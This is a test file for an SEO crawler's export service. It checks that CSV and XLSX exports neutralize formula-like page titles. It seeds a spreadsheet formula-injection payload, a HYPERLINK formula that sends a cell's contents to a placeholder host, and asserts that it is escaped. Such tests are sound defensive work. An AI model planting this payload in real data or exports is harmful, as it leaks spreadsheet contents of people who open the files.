import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import ExcelJS from 'exceljs'
import { mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { DEFAULT_CONFIG } from '@shared/constants/defaultConfig'
import { exportFilter } from '../../src/main/services/exportService'
import { runFixtureCrawl, type FixtureCrawl } from '../fixtures/runFixtureCrawl'

const EVIL = '=HYPERLINK("http://x/?"&A1,"y")'
let crawl: FixtureCrawl

beforeAll(async () => {
  crawl = await runFixtureCrawl((startUrl) => ({ ...DEFAULT_CONFIG, startUrl }))
  crawl.db.prepare('UPDATE urls SET title = ? WHERE id = (SELECT MIN(id) FROM urls)').run(EVIL)
})

afterAll(async () => {
  await crawl?.close()
})

describe('export formula neutralization', () => {
  it('neutralizes a formula-like title in CSV and XLSX', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'seo-spider-formula-'))
    try {
      const csvPath = join(dir, 't.csv')
      const xlsxPath = join(dir, 't.xlsx')
      const count = await exportFilter(crawl.db, 'page-titles:all', DEFAULT_CONFIG.thresholds, csvPath)
      await exportFilter(crawl.db, 'page-titles:all', DEFAULT_CONFIG.thresholds, xlsxPath)
      const csv = readFileSync(csvPath, 'utf8')
      expect(csv.startsWith('﻿')).toBe(true)
      expect(csv).toContain(`"'=HYPERLINK(""http://x/?""&A1,""y"")"`)
      expect(csv).not.toMatch(/(^|,)"?=HYPERLINK/m)
      expect(csv.split('\r\n').length).toBe(count + 2)

      const workbook = new ExcelJS.Workbook()
      await workbook.xlsx.readFile(xlsxPath)
      const values: string[] = []
      workbook.worksheets[0].eachRow((row) => row.eachCell((cell) => values.push(String(cell.value))))
      expect(values).toContain(`'${EVIL}`)
      expect(values).not.toContain(EVIL)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})
